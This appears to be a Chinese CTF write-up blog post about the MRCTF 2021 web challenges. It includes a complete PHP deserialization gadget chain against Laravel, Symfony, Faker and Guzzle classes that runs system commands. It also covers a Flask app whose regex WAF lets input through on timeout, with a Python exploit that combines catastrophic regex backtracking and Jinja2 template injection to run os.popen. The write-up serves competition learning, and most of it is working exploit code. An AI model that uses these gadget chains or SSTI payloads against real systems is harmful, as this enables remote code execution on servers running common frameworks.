---
title: 2021MRCTF web
date: 2021-04-17 18:49:50
updated: 2021-04-17 18:49:50
categories: Write up
---

2021MRCTF web writeup<!--more-->

## ez_larave1

全局搜索`unserialize`

![](https://img.npfs06.top/20210417185528.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

exp:

```php
<?php

// Exp来自chamd5 wp
//gadgets.php
namespace Illuminate\Foundation\Testing {
    class PendingCommand
    {
        protected $command;
        protected $parameters;
        protected $app;
        public $test;

        public function __construct($command, $parameters, $class, $app)
        {
            $this->command = $command;
            $this->parameters = $parameters;
            $this->test = $class;
            $this->app = $app;
        }
    }
}

namespace Illuminate\Auth {
    class GenericUser
    {
        protected $attributes;
        public function __construct(array $attributes)
        {
            $this->attributes = $attributes;
        }
    }
}

namespace Illuminate\Foundation {
    class Application
    {
        protected $hasBeenBootstrapped = false;
        protected $bindings;

        public function __construct($bind)
        {
            $this->bindings = $bind;
        }
    }
}

namespace Symfony\Component\Routing\Loader\Configurator {
    class CollectionConfigurator
    {
        public $parent;
        public $collection;
        public $prefixes;

        public function __construct($parent)
        {
            $this->prefixes = 1;
            $this->parent = $parent;
            $this->collection = new \Symfony\Component\Routing\RouteCollection(array("12end" => "12end"));
        }
    }
}

namespace Faker {
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;

        public function __construct($validator)
        {
            $this->generator = new \Symfony\Component\Routing\RouteCollection(array("12end" => "12end"));
            $this->validator = $validator;
            $this->maxRetries = 10;
        }
    }
}

namespace Symfony\Component\Routing {
    class RouteCollection
    {

    }
}

namespace GuzzleHttp\Psr7{
    class FnStream
    {
        public $_fn_close;
        public function __construct($f)
        {
            $this->_fn_close=$f;
        }
    }
}



namespace {
    $payload = new Illuminate\Foundation\Testing\PendingCommand(
        "system", array('cat /flag'),
        new Illuminate\Auth\GenericUser(array("expectedOutput" => array("0" => "1"), "expectedQuestions" => array("0" => "1"))),
        new Illuminate\Foundation\Application(array("Illuminate\Contracts\Console\Kernel" => array("concrete" => "Illuminate\Foundation\Application")))
    );
    
    $a = new GuzzleHttp\Psr7\FnStream(array($payload, "run"));
    echo urlencode(serialize($a));

}
```



![](http://img.npfs06.top/20210417184924.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)





## wwwafed_app

主要代码如下



```python
/source


from flask import Flask, request,render_template,url_for
from jinja2 import Template
import requests,base64,shlex,os

app = Flask(__name__)

@app.route("/")
def index():
	return render_template('index.html')

@app.route("/waf")
def wafsource():
	return open("waf.py").read()

@app.route("/source")
def appsource():
	return open(__file__).read()

@app.route("/api/spider/<url>")
def spider(url):
	url = base64.b64decode(url).decode('utf-8')
	safeurl = shlex.quote(url)
	block = os.popen("python3 waf.py " + safeurl).read()
	if block == "PASS":
		try:
			req = requests.get("http://"+url,timeout=5)
			return Template("访问成功!网页返回了{}字节数据".format(len(req.text))).render()
		except:
			return Template("访问{}失败！".format(safeurl)).render()
	else:
		return Template("WAF已拦截，请不要乱输入参数！").render()

if __name__ == "__main__":
	app.run(host="0.0.0.0",port=5000,debug=True)
```



```python
/waf

import re,sys
import timeout_decorator

@timeout_decorator.timeout(5)
def waf(url):
	# only xxx.yy-yy.zzz.mrctf.fun allow
	pat = r'^(([0-9a-z]|-)+|[0-9a-z]\.)+(mrctf\.fun)$'
	if re.match(pat,url) is None:
		print("BLOCK",end='') # 拦截
	else:
		print("PASS",end='') # 不拦截

if __name__ == "__main__":
	try:
		waf(sys.argv[1])
	except:
		print("PASS",end='')
```

这里有一个`@timeout_decorator.timeout(5)`

每个正则有着五秒的执行时间限制，超出时间默认采取放行策略。

这里可以采用正则最大回溯限制来绕过

<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank">PHP利用PCRE回溯次数限制绕过某些安全限制</a>

exp:

```python
import requests
import base64


for i in range(1,2):
    try:
        commd = """node.mrctf.fun"""+'a'*1000+"""{{a.__init__.__globals__.__builtins__.__import__("os").popen("ls /").read()}}"""
        #  pat = r'^(([0-9a-z]|-)+|[0-9a-z]\.)+(mrctf\.fun)$'
        # print()
        burp0_url = "http://node.mrctf.fun:15000/api/spider/" + base64.b64encode(commd.encode()).decode()
        proxies = {
            "http": "http://127.0.0.1:8080",
        }
        burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                         "Accept": "*/*", "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                         "Accept-Encoding": "gzip, deflate", "Connection": "close", "Referer": "http://node.mrctf.fun:15000/"}
        r = requests.get(burp0_url, headers=burp0_headers)
        print(r.text)
    except:
        pass
```

